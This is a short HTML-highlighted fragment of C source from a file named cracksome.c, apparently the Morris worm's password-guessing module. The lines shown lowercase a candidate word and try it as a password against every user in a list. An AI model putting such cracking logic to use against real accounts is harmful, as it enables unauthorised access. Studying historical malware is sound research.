    </span><span class="sc11">buf</span><span class="sc10">[</span><span class="sc4">0</span><span class="sc10">]</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">tolower</span><span class="sc10">(</span><span class="sc11">buf</span><span class="sc10">[</span><span class="sc4">0</span><span class="sc10">]);</span><span class="sc0">

    </span><span class="sc5">for</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">user</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">x27f28</span><span class="sc10">;</span><span class="sc0"> </span><span class="sc11">user</span><span class="sc10">;</span><span class="sc0"> </span><span class="sc11">user</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">user</span><span class="sc10">-&gt;</span><span class="sc11">next</span><span class="sc10">)</span><span class="sc0">
    </span><span class="sc11">try_passwd</span><span class="sc10">(</span><span class="sc11">user</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">buf</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc5">return</span><span class="sc10">;</span><span class="sc0">                 </span><span class="sc1">/* 2988 */</span><span class="sc0">
</span><span class="sc10">}</span><span class="sc0">
    
</span><span class="sc1">/*
 * Local variables:
 * comment-column: 48
 * compile-command: "cc -S cracksome.c"
 * End:
 */</span><span class="sc0">

</span></div></body>
</html>
